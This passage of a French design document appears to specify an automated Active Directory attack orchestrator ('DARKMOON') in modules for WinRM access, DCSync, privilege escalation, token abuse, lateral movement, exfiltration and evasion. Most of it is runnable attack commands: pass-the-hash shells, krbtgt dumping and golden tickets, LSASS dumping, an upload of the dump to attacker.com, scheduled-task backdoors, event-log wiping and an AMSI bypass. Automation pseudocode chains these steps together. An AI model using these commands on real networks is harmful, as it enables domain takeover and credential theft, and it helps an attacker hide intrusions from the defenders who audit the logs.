    lateral_pivoting_possible: boolean,
    output_files: [string]
}
```

---

## ⚙️ LOGIQUE : `engine_ad_winrm()`

---

### 🔍 Phase 1 – Scan & Enum

```bash
nmap -p5985,5986 --script http-winrm-enum <target>
```

- 🔎 Enum des bindings WinRM
- Détection des ports TCP 5985 (HTTP) / 5986 (HTTPS)
- Output : `/output/ad/<target>/winrm/open_hosts.txt`

---

### 🔐 Phase 2 – Auth & Remote Shell

```bash
evil-winrm -i <target> -u <user> -p <pass>
evil-winrm -i <target> -u <user> -H <NTLM>
```

- Authentification avec :
  - Creds clairs
  - NTLM hash
  - Certificat (pass-the-cert) [si module ADCS déclenché]
- Output : `/output/ad/<target>/winrm/command_exec.log`

---

### 📦 Phase 3 – Outils d’Exploitation

```bash
# Depuis la session evil-winrm :
upload Seatbelt.exe
upload SharpUp.exe
upload winpeas.exe
```

- Uploader des outils post-exploitation :
  - Reco système
  - Enum privilèges
  - Enum tokens

---

### 🧪 Phase 4 – Token Reuse / Pass-the-Token

```bash
# Dans une session antérieure :
mimikatz → sekurlsa::logonpasswords
incognito → list_tokens → impersonate
# Puis sur host compromis :
evil-winrm -i <target2> -u <user> -H <token_hash>
```

- Pivot latéral à l’aide de tokens volés
- Réutilisation de sessions existantes ou détournées
- Output : `/output/ad/<target>/winrm/loot_inventory.md`

---

## 🛠️ SCRIPT AUTOMATION

| Script                  | Description                                 |
|-------------------------|---------------------------------------------|
| `winrm_scan.bat`        | Scan & nmap script                          |
| `evil_shell.bat`        | Connexion shell WinRM avec hash ou pass     |
| `upload_loot.bat`       | Automatisation de l’upload d’outils         |
| `winrm_pivot.ps1`       | Pivot token/session entre hosts             |

---

## 🔥 MITRE / CVE Mapping

| MITRE ID         | Description                                          |
|------------------|------------------------------------------------------|
| T1021.006         | Remote Services: Windows Remote Management (WinRM) |
| T1077             | Windows Admin Shares                               |
| T1550.003         | Pass-the-Hash / Token Reuse                        |
| T1047             | Windows Management Instrumentation (WMI) fallback   |

| CVE ID            | Description                          |
|-------------------|--------------------------------------|
| CVE-2021-31166     | HTTP.sys WinRM (DoS)                |
| CVE-2015-2370      | NTLM relay abuse with WinRM        |

---

## 🧠 INTELLIGENCE HEURISTIQUE

```pseudocode
IF port 5985 OR 5986 is open:
    → Trigger evil-winrm scan
    → Try with known credentials / hashes
    → Upload reconnaissance tools
    → Parse output to detect privileges and tokens

IF mimikatz finds impersonable token:
    → Use incognito or PsExec to pivot
    → Reuse access via evil-winrm from second host
```

---

## 📤 OUTPUTS DU MODULE

| Fichier                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `/output/ad/<target>/winrm/open_hosts.txt`              | Ports WinRM détectés avec détails                |
| `/output/ad/<target>/winrm/command_exec.log`            | Logs de shell à distance                         |
| `/output/ad/<target>/winrm/loot_inventory.md`           | Liste des outils déployés et tokens collectés    |

---

## 🔐 MODULE : `engine_ad_dcsync(target: ADTarget)`

---

## 📦 [TYPE_ABSTRAIT] ADDCSyncContext

```
ADDCSyncContext {
    has_replication_rights: boolean,
    dcsync_possible: boolean,
    krbtgt_hash_dumped: boolean,
    golden_ticket_created: boolean,
    hashes_exfiltrated: [string],
    mimikatz_exec_path: string,
    output_files: [string]
}
```

---

## ⚙️ LOGIQUE : `engine_ad_dcsync()`

---

### 🔍 Phase 1 – Vérification des Droits DCSync

```bash
bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc_ip> -c acl
```

- Vérifie si l’utilisateur dispose de :
  - `GetChanges`
  - `GetChangesAll`
  - Permissions sur objets `Domain`, `Configuration`, etc.
- Analyse visuelle via BloodHound Neo4j
- ➜ `T1207`, `T1003.006`

---

### 🔓 Phase 2 – Dump via DCSync (Impacket)

```bash
secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc
```

- Exfiltration des hashes depuis NTDS
- Dump du compte `krbtgt`, `Administrator`, etc.
- Output :
  - `/output/ad/<target>/dcsync/full_ntdsdump.log`
  - `/output/ad/<target>/dcsync/krbtgt_hash.txt`

---

### 🎯 Phase 3 – Dump via Mimikatz (Alternative)

```powershell
mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt
```

- Variante avec outil sur hôte compromis
- Peut s’appuyer sur Pass-the-Hash ou Token Injection
- ➜ Output identique à Impacket

---

### 🎭 Phase 4 – Création de Golden Ticket

```powershell
mimikatz # kerberos::golden /domain:<domain> /sid:<sid> /krbtgt:<hash> /user:Administrator
```

- Génère un `.kirbi` utilisable via `klist` ou `Rubeus`
- ➜ `/output/ad/<target>/dcsync/golden_ticket.kirbi`

---

### 🛠️ SCRIPT AUTOMATION

| Script                    | Description                                 |
|---------------------------|---------------------------------------------|
| `dcsync_rights_check.bat` | BloodHound + rights analysis                |
| `dcsync_dump_hashes.bat`  | secretsdump.py avec redirect output         |
| `golden_ticket_gen.ps1`   | Mimikatz ticket generation + inject         |

---

### 📤 OUTPUTS ORGANISÉS

| Fichier                                                   | Description                                  |
|-----------------------------------------------------------|----------------------------------------------|
| `/output/ad/<target>/dcsync/krbtgt_hash.txt`             | Hash NTLM krbtgt                             |
| `/output/ad/<target>/dcsync/full_ntdsdump.log`           | Hashes de tous les comptes AD                |
| `/output/ad/<target>/dcsync/golden_ticket.kirbi`         | Ticket TGT falsifié                          |

---

### 📌 MITRE / CVE Mapping

| MITRE ID         | Description                                           |
|------------------|-------------------------------------------------------|
| T1003.006        | Credentials from Password Store: DCSync              |
| T1558.001        | Steal or Forge Kerberos Tickets: Golden Ticket       |
| T1550.003        | Pass-the-Ticket / NTLM reuse                         |

| CVE ID            | Description                            |
|-------------------|----------------------------------------|
| CVE-2021-42278     | sAMAccountName spoofing (→ RBCD chain) |
| CVE-2021-42287     | Admin impersonation post spoof        |

---

### 🧠 INTELLIGENCE HEURISTIQUE

```pseudocode
IF BloodHound shows edge "GetChangesAll":
    → Trigger DCSync module
    → Dump NTDS via secretsdump
    → Extract krbtgt NTLM
    → Create golden ticket
    → Trigger lateral_movement_chain()
ELSE:
    → Suggest module engine_ad_privesc() to escalate first
```

---

### 🔐 MODULE : `engine_ad_localprivesc(target: ADTarget)`

---

## 🧠 [TYPE_ABSTRAIT] ADLocalPrivescContext

```
ADLocalPrivescContext {
    host: string,
    privilege_level: Low | Medium | High,
    tools_used: [string],
    cves_detected: [string],
    successful_exploit: boolean,
    exploit_used: string,
    output_files: [string]
}
```

---

## ⚙️ STRUCTURE : `engine_ad_localprivesc()`

---

### 🔎 PHASE 1 – Enumération Locale

**Objectif : Identifier vecteurs LPE (Local Privilege Escalation)**

```cmd
winPEASany.exe quiet > local_enum.txt
Seatbelt.exe -group=all > seatbelt_enum.txt
SharpUp.exe > sharpup_results.txt
powershell -ep bypass -f PowerUp.ps1 > powerup.txt
```

🧠 Recherche automatique :
- Unquoted Service Paths
- Weak Permissions on Binaries
- Autoruns modifiables
- DLL Hijacking
- User in local admin group
- CVE connus par version Windows (LPE)

---

### 🛠️ PHASE 2 – Exploits Automatiques

**Objectif : exploiter directement un vecteur local confirmé**

- CVE Exploits Automatisés :
```powershell
Invoke-MS16-032
Invoke-CVE-2022-21882
Invoke-CVE-2021-1732
```

- Service misconfiguré :
```cmd
sc config vulnsvc binpath= "cmd.exe /c whoami > C:\Users\Public\owned.txt"
net start vulnsvc
```

- DLL Hijacking :
```powershell
Compile rogue DLL → Drop in vulnerable path → Trigger service
```

- Script automatisé : `auto_lpe.bat`

---

### ⏰ PHASE 3 – Scheduled Task Hijack

**Objectif : utiliser les tâches planifiées faibles**

- Détection avec SharpUp
- Injection via `schtasks` :

```cmd
schtasks /change /TN "Microsoft\Windows\Defrag\ScheduledDefrag" /TR "C:\Tools\reverse_shell.bat"
schtasks /run /TN "Microsoft\Windows\Defrag\ScheduledDefrag"
```

---

### 🧰 SCRIPTS AUTOMATIQUES

| Script                     | Description                                  |
|----------------------------|----------------------------------------------|
| `local_enum.bat`           | Exécution de winPEAS + Seatbelt + PowerUp   |
| `auto_lpe.bat`             | Déclenchement automatique d’exploit         |
| `task_hijack.bat`          | Injection dans tâche planifiée              |

---

### 🧩 MITRE ATT&CK MAPPING

| Tactic            | Technique ID       | Description                             |
|-------------------|--------------------|-----------------------------------------|
| Privilege Escal.  | T1068              | Exploitation for Privilege Escalation   |
| Privilege Escal.  | T1548.002          | Bypass UAC                              |
| Persistence       | T1053.005          | Scheduled Task/Job: Scheduled Task      |
| Persistence       | T1574.002          | DLL Side-Loading                        |

---

### 🔍 CVE MAPPING

| CVE ID            | Description                                     |
|-------------------|-------------------------------------------------|
| CVE-2022-21882     | RpcSS Elevation via Win32k                     |
| CVE-2021-1732      | Win32k LPE via NtUserConsoleControl           |
| CVE-2016-0099      | MS16-032 Token Impersonation                  |

---

### 📂 OUTPUTS STRUCTURÉS

| Fichier                                                    | Description                             |
|------------------------------------------------------------|-----------------------------------------|
| `/output/ad/<target>/privesc/local_enum.txt`              | Résultat winPEAS/SharpUp/PowerUp        |
| `/output/ad/<target>/privesc/auto_pwn.log`                | Exploit auto lancé                      |
| `/output/ad/<target>/privesc/exploit_success.flag`        | Indicateur de réussite (whoami = SYSTEM) |

---

### 🔁 LOGIQUE HEURISTIQUE (PSEUDOCODE)

```pseudocode
IF user != admin AND winPEAS shows vulnerable path:
    → Trigger LPE via unquoted service path
ELSE IF ScheduledTask writable AND modifiable:
    → Inject command → schtasks run
ELSE IF CVE matched AND system exploitable:
    → Trigger CVE exploit (PowerShell)
ELSE:
    → Log / escalate manually via lateral module
```

---

### 🛡️ MODULE : `engine_ad_token(target: ADTarget)`

---

## 🧠 [TYPE_ABSTRAIT] ADTokenContext

```
ADTokenContext {
    host: string,
    user_privilege: string,
    tokens_available: [string],
    tokens_impersonated: [string],
    impersonation_success: boolean,
    tool_used: string,
    privileged_context_obtained: boolean,
    output_paths: [string]
}
```

---

## ⚙️ STRUCTURE : `engine_ad_token()`

---

### 🔍 PHASE 1 – Token Enumeration

**Objectif : Découverte des tokens actifs, volatiles ou impersonables.**

```cmd
# Avec Rubeus :
Rubeus.exe dump /monitor > tokens_list.txt

# Avec Incognito :
incognito.exe list_tokens -u > incognito_list.txt

# Avec SharpToken :
SharpToken.exe list > sharptoken_enum.txt
```

🧠 **Signaux recherchés :**
- Tokens SYSTEM, Domain Admin, svc-*
- Sessions impersonables
- Opportunité de duplication (logon, delegation, impersonation)

---

### 🎭 PHASE 2 – Token Impersonation & Abuse

**Objectif : Abus des tokens SYSTEM/DA pour élévation ou persistance**

- **Impersonate avec Incognito** :
```cmd
incognito.exe impersonate_token "DOMAIN\Admin"
```

- **UseToken avec Tokenvator** :
```cmd
Tokenvator.exe -m UseToken -t "DA Token"
```

- **TGT Delegation avec Rubeus** :
```cmd
Rubeus.exe tgtdeleg /user:lowpriv /domain:corp.local /rc4:<hash>
```

- **Élévation auto avec MakeToken** :
```cmd
Tokenvator.exe -m MakeToken -u "Administrator"
```

🧠 Vérification post-commande :
```cmd
whoami > validate_token_use.txt
```

---

### 🔒 PHASE 3 – Tokens Persistants & Process Hunting

**Objectif : Trouver des process contenant des tokens SYSTEM/DA impersonables**

- **Avec SharpUp** :
```cmd
SharpUp.exe --tokens-only > tokens_in_processes.txt
```

- **Analyse des PID avec ProcessHacker / PowerShell**

---

## 🧰 SCRIPTS AUTOMATIQUES

| Script                     | Description                                        |
|----------------------------|----------------------------------------------------|
| `token_enum.bat`           | Dump Rubeus + Incognito + SharpToken              |
| `impersonate_token.bat`    | Tentative de prise de token DA/SYSTEM             |
| `validate_token.bat`       | Vérification du contexte post-abus                |

---

### 🧩 MITRE ATT&CK MAPPING

| Tactic            | Technique ID       | Description                                 |
|-------------------|--------------------|---------------------------------------------|
| Privilege Escal.  | T1134.001          | Token Impersonation                         |
| Privilege Escal.  | T1134.002          | Token Duplication                           |
| Lateral Movement  | T1550.003          | Pass-the-Ticket (via Rubeus + tgtdeleg)     |

---

### 🔍 CVE MAPPING

| CVE ID            | Description                                          |
|-------------------|------------------------------------------------------|
| CVE-2020-17049     | Delegation abuse via constrained delegation bypass  |
| CVE-2022-26923     | Cert abuse escalade (lié à pass-the-cert → token)   |

---

### 📂 OUTPUTS STRUCTURÉS

| Fichier                                                     | Description                                      |
|-------------------------------------------------------------|--------------------------------------------------|
| `/output/ad/<target>/token/tokens_list.txt`                | Liste complète des tokens                        |
| `/output/ad/<target>/token/impersonation_success.log`      | Résultat de l’exploitation réussie               |
| `/output/ad/<target>/token/da_shell_triggered.flag`        | Indicateur si un shell DA a été obtenu           |

---

### 🔁 LOGIQUE HEURISTIQUE (PSEUDOCODE)

```pseudocode
IF token SYSTEM or DA detected in any session:
    → Attempt impersonation via Incognito
    → IF success → log + escalate context
ELSE IF tgtdeleg permitted:
    → Use Rubeus to create TGT
    → Use tokenvator for elevated execution
ELSE:
    → Output list + move to lateral module
```

---

### 🛰️ MODULE : `engine_ad_lateral(target: ADTarget)`

---

## 🧠 [TYPE_ABSTRAIT] ADLateralContext

```
ADLateralContext {
    reachable_hosts: [string],
    credentials: [Credential],
    winrm_hosts: [string],
    smb_hosts: [string],
    rdp_hosts: [string],
    wmi_hosts: [string],
    credentials_reused: [string],
    payload_deployed: boolean,
    tool_used: [string],
    result: string
}
```

---

## ⚙️ STRUCTURE : `engine_ad_lateral()`

---

### 🔍 PHASE 1 – Découverte des vecteurs de déplacement latéral

**Objectif : Identifier les hôtes joignables via WinRM, SMB, RDP, WMI.**

```cmd
# Vérification accès SMB/WinRM :
crackmapexec smb <target_subnet> -u <user> -p <pass>
crackmapexec winrm <target_subnet> -u <user> -p <pass>

# Scan rapide ports pivot :
nmap -p135,445,3389,5985 -T4 -Pn <target_subnet> --open
```

🧠 **Signaux recherchés** :
- Réponse authentifiée via SMB/WinRM
- Ports ouverts permettant exécution distante

---

### 📡 PHASE 2 – Rebond & Exécution à distance

**Objectif : Utiliser les accès pour exécuter des payloads ou ouvrir des shells.**

- **WMI** :
```powershell
powershell -ExecutionPolicy Bypass -File Invoke-WMIExec.ps1 -Target <target> -User <user> -Pass <pass> -Command "whoami"
```

- **PsExec** :
```cmd
PsExec.exe -i -s \\<target> cmd.exe
```

- **Tâches planifiées** :
```cmd
schtasks /create /s <target> /ru SYSTEM /sc once /tn backdoor /tr C:\payload.bat /st 00:01
```

---

### 🔁 PHASE 3 – Réutilisation des credentials

**Objectif : Utiliser les mots de passe ou TGT collectés pour étendre le contrôle**

- **Pass-the-Hash (PTH)** :
```cmd
crackmapexec smb <target> -u Administrator -H <NTLM hash>
```

- **Rubeus TGT Reuse** :
```cmd
Rubeus.exe ptt /ticket:<.kirbi>
```

- **TGS abuse (Pass-the-Ticket)** :
```cmd
Rubeus.exe tgtdeleg /user:<user> /domain:<domain>
```

---

## 🧰 SCRIPTS AUTOMATIQUES

| Script                      | Description                                      |
|-----------------------------|--------------------------------------------------|
| `lateral_enum.bat`          | CME SMB + WinRM + portscan                      |
| `pivot_exec.bat`            | Execute via PsExec or WMI                       |
| `reuse_creds.bat`           | Pass-the-Hash / Ticket injection               |

---

### 🧩 MITRE ATT&CK MAPPING

| Tactic            | Technique ID    | Description                        |
|-------------------|-----------------|------------------------------------|
| Lateral Movement  | T1021.001       | Remote Services: SMB/WinRM         |
| Lateral Movement  | T1053.005       | Scheduled Task abuse               |
| Lateral Movement  | T1077           | Windows Admin Shares               |
| Credential Access | T1550.003       | Pass-the-Hash                      |

---

### 🛠️ CVE MAPPING

| CVE ID            | Description                                        |
|-------------------|----------------------------------------------------|
| CVE-2020-1472     | Zerologon → Initial foothold to use lateral pivot  |
| CVE-2019-0708     | RDP/BlueKeep vuln (si port 3389 ouvert)            |

---

### 📂 OUTPUTS STRUCTURÉS

| Fichier                                                          | Description                                  |
|------------------------------------------------------------------|----------------------------------------------|
| `/output/ad/<target>/pivot/pivotable_hosts.txt`                 | Liste des hôtes accessibles                  |
| `/output/ad/<target>/pivot/execution_success.log`               | Résultat des commandes exécutées             |
| `/output/ad/<target>/pivot/networkgraph.dot`                    | Graphe de mouvement latéral en .dot          |

---

### 🔁 PSEUDOCODE HEURISTIQUE

```pseudocode
FOR each host IN reachable_hosts:
    IF smb/rdp/winrm access is valid:
        → test execution (PsExec, WMI, schtasks)
        → log output, update context
    IF credentials_reused successfully:
        → log token used
        → trigger follow-up: privesc + exfil modules
```

---

### 🗃️ MODULE : `engine_ad_exfil(target: ADTarget)`

---

## 🧠 [TYPE_ABSTRAIT] ADExfiltrationContext

```
ADExfiltrationContext {
    has_lsass_dump: boolean,
    has_ticket: boolean,
    has_files: boolean,
    exfil_methods: [string],
    share_accessible: [string],
    dumped_data: [string],
    encoded_payloads: [string],
    transport: HTTPS | SMB | Drive,
    result: string
}
```

---

## ⚙️ STRUCTURE : `engine_ad_exfil()`

---

### 🔍 PHASE 1 – Dump mémoire et credentials

**Objectif : Récupérer identifiants et secrets système.**

```cmd
# Dump mémoire de LSASS avec Procdump
procdump64.exe -ma lsass.exe C:\Users\Public\lsass.dmp

# Lecture des credentials avec Mimikatz
mimikatz.exe
sekurlsa::logonpasswords
```

🧠 **Signaux d’alerte** :
- Token SYSTEM
- Création de `lsass.dmp`
- Dump logon credentials / kerberos / cleartext

---

### 📁 PHASE 2 – Récupération de fichiers sensibles

**Objectif : Extraction via C$, partages SMB ou net view**

```cmd
# Découverte de partages
net view \\<target>
smbclient -U <user>%<pass> //<target>/C$ -c "ls"

# Téléchargement d’un fichier critique
smbclient -U <user>%<pass> //<target>/C$ -c "lcd loot; get secrets.txt"

# Ou copie simple Windows
copy \\<target>\C$\Users\Public\secrets.txt loot\
```

---

### 🔐 PHASE 3 – Encodage et Exfiltration

**Objectif : Obfuscation et envoi via canal sortant**

- **Base64 certutil** :
```cmd
certutil -encode lsass.dmp lsass.txt
```

- **PowerShell Exfil** :
```powershell
Invoke-WebRequest -Uri https://attacker.com/upload -Method POST -InFile lsass.txt
```

- **Rclone vers Cloud** :
```cmd
rclone copy secrets.txt remote:ad_exfil/target
```

---

## 🧰 SCRIPTS AUTOMATIQUES

| Script                     | Description                               |
|----------------------------|-------------------------------------------|
| `dump_lsass.bat`           | Procdump + Mimikatz                       |
| `file_exfil.bat`           | SMB + copy partages                       |
| `exfil_b64_https.ps1`      | Encode + exfil via HTTPS                  |
| `rclone_exfil.bat`         | Exfil via Rclone                          |

---

### 🧩 MITRE ATT&CK MAPPING

| Tactic            | Technique ID   | Description                                  |
|-------------------|----------------|----------------------------------------------|
| Credential Access | T1003.001      | LSASS Memory                                 |
| Exfiltration      | T1041          | Exfiltration Over C2 Channel (HTTPS, SMB)   |
| Discovery         | T1083          | File and Directory Discovery                 |

---

### 🛠️ CVE MAPPING

| CVE ID            | Description                                            |
|-------------------|--------------------------------------------------------|
| CVE-2021-36934    | HiveNightmare - accès au SAM/SECURITY/SYSTEM non protégé |

---

### 📂 OUTPUTS STRUCTURÉS

| Fichier                                                               | Description                                  |
|-----------------------------------------------------------------------|----------------------------------------------|
| `/output/ad/<target>/exfil/lsass_dump.dmp`                           | Dump brut de LSASS                           |
| `/output/ad/<target>/exfil/lsass_logonpasswords.txt`                | Résultat de Mimikatz                         |
| `/output/ad/<target>/exfil/secrets_collected/<filename>`            | Fichiers copiés depuis partages              |
| `/output/ad/<target>/exfil/encoded_payloads/<payload>.b64`          | Payload encodé pour transmission             |
| `/output/ad/<target>/exfil/exfil_log.txt`                           | Journal de transfert (date, canal, succès)   |

---

### 🔁 PSEUDOCODE HEURISTIQUE

```pseudocode
IF user has SYSTEM priv OR Mimikatz active:
    → dump lsass
    → extract tokens, tickets, cleartext

IF C$ accessible AND file found:
    → copy file
    → base64 encode + exfil via HTTPS or drive

IF share contains .xml / .ps1 / .cred:
    → tag as sensitive
    → priority exfil route

Record outputs → engine_ad_reporting()
```

---

### 🕵️ MODULE : `engine_ad_evasion(target: ADTarget)`

---

## 🧠 [TYPE_ABSTRAIT] ADEvasionContext

```
ADEvasionContext {
    edr_vendor: string,
    has_amsi: boolean,
    log_cleared: boolean,
    shellcode_execution: boolean,
    bypass_used: [string],
    memory_injection: boolean,
    obfuscation_level: Low | Medium | High,
    success: boolean,
    result: string
}
```

---

## ⚙️ STRUCTURE : `engine_ad_evasion()`

---

### 🔥 PHASE 1 – Nettoyage des logs et des traces

**Objectif : Supprimer toutes traces post-exploitation**

```cmd
# Supprimer logs Windows
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Supprimer les prefetch
del /f /q C:\Windows\Prefetch\*

# Historique PowerShell
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
```

---

### 🧪 PHASE 2 – Obfuscation de charge utile

**Objectif : Éviter détection par signature**

- **PSOffuscatron** :
```powershell
Invoke-Obfuscation -ScriptBlock { Invoke-Mimikatz }
```

- **Shellcode loader (Donut)** :
```cmd
donut.exe -f mimikatz.exe -o shellcode.bin
```

- **Encode base64** :
```powershell
$cmd = 'Invoke-Mimikatz'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); [Convert]::ToBase64String($bytes)
```

---

### 🦠 PHASE 3 – Bypass AMSI, Antimalware, EDR

**AMSI bypass classique** :
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Injections mémoire** :
- **via PowerShell Reflective PE loader** (Invoke-ReflectivePEInjection)
- **via Cobalt Strike / Empire**
- **via SharpShooter (JS + shellcode injection)**

---

## 🧰 SCRIPTS AUTOMATIQUES

| Script                        | Description                              |
|-------------------------------|------------------------------------------|
| `clean_logs.bat`              | Suppression des journaux                 |
| `obfuscate_payload.ps1`       | Encode + Obfuscation PowerShell          |
| `bypass_amsi.ps1`             | Injection AMSI                           |
| `inject_shellcode.bat`        | Donut + execution PE en mémoire          |

---

### 🧩 MITRE ATT&CK MAPPING

| Tactic              | Technique ID    | Description                              |
|---------------------|------------------|------------------------------------------|
| Defense Evasion     | T1070.001        | Clear Windows Event Logs                 |
| Defense Evasion     | T1055            | Process Injection                        |
| Defense Evasion     | T1027            | Obfuscated Files or Information          |
| Credential Access   | T1555.003        | Credentials from Browser Data            |

---

### 🛠️ CVE MAPPING

| CVE ID            | Description                                     |
|-------------------|-------------------------------------------------|
| CVE-2017-11774    | Outlook command execution → evasion by macro    |
| CVE-2020-0601     | Curveball cert spoof (bypass trust)             |

---

### 📂 OUTPUTS STRUCTURÉS

| Fichier                                                        | Description                              |
|----------------------------------------------------------------|------------------------------------------|
| `/output/ad/<target>/evasion/logs_cleaned.log`                | Résumé de suppression                    |
| `/output/ad/<target>/evasion/obfuscated_payload.ps1`          | Payload PowerShell offusqué              |
| `/output/ad/<target>/evasion/amsi_bypass_success.flag`        | Flag de succès                           |
| `/output/ad/<target>/evasion/shellcode_injection_trace.log`   | Injection shellcode                      |

---

### 🔁 PSEUDOCODE HEURISTIQUE

```pseudocode
IF Mimikatz or LSASS tool used:
    → Clear logs
    → Remove PowerShell history

IF AMSI detected AND not bypassed:
    → Inject AMSI bypass
    → Retry execution

IF edr_vendor != null:
    → Load obfuscated payload
    → Prefer Donut or Reflective DLL

Record all outputs → engine_ad_reporting()
```

---

### 🔐 GIGAPROMPT STRATÉGIQUE : INFRASTRUCTURE ACTIVE DIRECTORY (ORCHESTRATEUR FINAL GLOBAL)

---

## 🧠 [TYPE_ABSTRAIT] HeuristicADReactionEngine

```plaintext
HeuristicADReactionEngine {
    target: ADTarget,
    observe(target: ADTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(next: NextStep) → CommandePentest[],
    orchestrate() → RésultatPentest
}
```

## 📦 [TYPE_ABSTRAIT] ADTarget

```plaintext
ADTarget {
    ip: string,
    fqdn: string,
    domain: string,
    netbios: string,
    os_banner: string,
    ports_open: [int],
    protocols_detected: [string],
    kerberos: boolean,
    ldap: boolean,
    smb: boolean,
    adcs: boolean,
    gpo: boolean,
    rdp: boolean,
    winrm: boolean,
    trust_forest: boolean,
    access_level: enum<Anonymous | Authenticated | Admin>,
    reconnaissance_done: boolean,
    raw_signals: [Signal],
    vuln_surface: [VulnContext]
}
```

## 🧠 INTERFACE DIALOGUÉE CLI (MODE OPÉRATIONNEL)

```plaintext
████████████████████████████████████████████████████████████
█              DARKMOON AD ORCHESTRATOR ENGINE             █
█         Infrastructure Active Directory Heuristique      █
████████████████████████████████████████████████████████████

Veuillez choisir une action :

[1] Phase 1 : Scan & Fingerprint Cible AD
[2] Phase 2 : Analyse Heuristique & Déclenchement Modules
[3] Phase 3 : Exécution Sélective (Modules Individuels)
[4] Phase 4 : Orchestration Complète Automatisée
[5] Phase 5 : Génération Rapport TTP & CVE-Mapping
[6] Phase 6 : Générer les Scripts batch/Powershell
[7] Visualiser les logs d’un module
[8] Nettoyer et quitter

Votre choix (ex: 1) :
> 
```

---

** Logique dynamique de reconnaissance et déclencheurs de modules**

---

## 🎯 [TYPE_ABSTRAIT] Signal

```plaintext
Signal {
    source: string,
    type: enum<Port | Banner | LDAP | SMB | DNS | Kerberos | RDP | WinRM | ADCS | GPO>,
    content: string,
    confidence: enum<Low | Medium | High>,
    metadata: any
}
```

## 💡 [TYPE_ABSTRAIT] Hypothesis

```plaintext
Hypothesis {
    type: enum<VulnType>,
    evidence: [Signal],
    probable_cwe: [CWE],
    impact: enum<Low | Medium | High | Critical>,
    confirmed: boolean,
    test_plan: [Experiment]
}
```

## 🔬 Détection dynamique des patterns de déclenchement (logique MITRE ↔ CVE ↔ CPE)

```plaintext
IF port 88 AND Kerberos active THEN
    → Trigger MODULE : ad_kerberos_module()

IF port 389 AND anonymous bind accepted THEN
    → Trigger MODULE : ad_ldap_module()

IF port 445 AND SMB null session OK THEN
    → Trigger MODULE : ad_smb_module()

IF directory contains SYSVOL/GPO folders THEN
    → Trigger MODULE : ad_gpo_module()

IF certsrv found OR port 135 + 49152 detected THEN
    → Trigger MODULE : ad_adcs_module()

IF rdp detected AND encryption level < HIGH THEN
    → Trigger MODULE : ad_rdp_module()

IF port 5985 or 5986 open THEN
    → Trigger MODULE : ad_winrm_module()

IF ldap bloodhound edge == GetChangesAll THEN
    → Trigger MODULE : ad_dcsync_module()

IF SharpHound returns GenericWrite to DA THEN
    → Trigger MODULE : ad_privilege_escalation_chain()

IF local tools detect privesc LPE pattern THEN
    → Trigger MODULE : ad_localprivesc_module()

IF valid lateral SMB/WinRM found THEN
    → Trigger MODULE : ad_lateral_pivot_module()

IF secrets exposed / hashes dumped THEN
    → Trigger MODULE : ad_exfiltration_module()

IF audit policies/logging detected THEN
    → Trigger MODULE : ad_detection_evasion_module()
```

---

## 📊 Exemple de Mapping MITRE ↔ CVE ↔ MODULE

| MITRE Tactic     | Technique ID | Vuln / CVE          | Module AD Trigger |
|------------------|--------------|----------------------|-------------------|
| Credential Access| T1558.003    | CVE-2021-42278/87    | ad_kerberos       |
| Privilege Esc.   | T1484.002    | ACL Abuse / SIDHist  | ad_privilege_escalation_chain |
| Lateral Movement | T1021.002    | None (auth reuse)    | ad_lateral_pivot  |
| Discovery        | T1087.002    | LDAP/Anonymous       | ad_ldap_module    |
| Impact           | T1489        | PrintNightmare       | ad_localprivesc_module |
| Persistence      | T1098.003    | AdminSDHolder Abuse  | ad_gpo_module     |

---

**Orchestration intelligente, logique adaptative inter-modules**

---

## 🔁 [TYPE_ABSTRAIT] ExecutionChain

```plaintext
ExecutionChain {
    modules_to_trigger: [ADModule],
    rationale: string,
    dependencies: [Signal | Hypothesis],
    output_conditions: [Observation],
    failover_paths: [ExecutionChain]
}
```

## 🔀 [TYPE_ABSTRAIT] ADModule

```plaintext
ADModule {
    name: string,
    description: string,
    trigger_pattern: Signal[],
    expected_outcome: string,
    success_path: ExecutionChain[],
    fail_path: ExecutionChain[],
    tools_used: [string],
    outputs: [string]
}
```

---

## 🧠 Arbre d’orchestration conditionnelle (pseudo-graph adaptatif)

```plaintext
engine_ad_final(target):
    signals = observe(target)
    hypotheses = match(signals)
    
    for h in hypotheses:
        if h.confirmed:
            exec_chain = create_chain(h)
            execute(exec_chain)
        else:
            test(h)
            if confirmed:
                exec_chain = create_chain(h)
                execute(exec_chain)
```

---

## 📈 Chaînes dynamiques recommandées (exemples de scénarios multi-modulaires)

### 🎯 Cas 1 : Kerberos exposé + SPN détecté + SMB null session → Exploit + Pivot

```plaintext
ExecutionChain_1 = [
    ad_kerberos_module(),
    ad_smb_module(),
    ad_token_module(),
    ad_lateral_pivot_module()
]
```

### 🎯 Cas 2 : ADCS détecté + Template exploitable + accès LDAP complet

```plaintext
ExecutionChain_2 = [
    ad_adcs_module(),
    ad_ldap_module(),
    ad_privilege_escalation_chain(),
    ad_dcsync_module()
]
```

### 🎯 Cas 3 : RDP détecté + bruteforce possible + LSASS accessible

```plaintext
ExecutionChain_3 = [
    ad_rdp_module(),
    ad_localprivesc_module(),
    ad_exfiltration_module()
]
```

---

## 🔄 Redondance et résilience (failover logic)

```plaintext
IF ad_kerberos_module() fails
    AND smb shares accessible THEN
        → Execute ad_smb_module() + dump password.txt from SYSVOL

IF ad_adcs_module() fails
    AND LDAP enum OK AND ACL writable THEN
        → Trigger ad_privilege_escalation_chain()

IF ad_winrm_module() fails
    AND WMI access open THEN
        → Rebond via ad_lateral_pivot_module() with Invoke-WMIExec
```

---

## 🧠 Smart loop logique (pattern-reason-react)

```plaintext
FOR each signal:
    hypothesis = generate()
    IF hypothesis.tested AND confirmed:
        modules = map_to_modules(hypothesis)
        FOR m in modules:
            results = execute(m)
            analyze(results)
            IF result.confirmed:
                trigger follow-up module
```

---

**Console interactive type CLI / Menu d’orchestration modulaire**

---

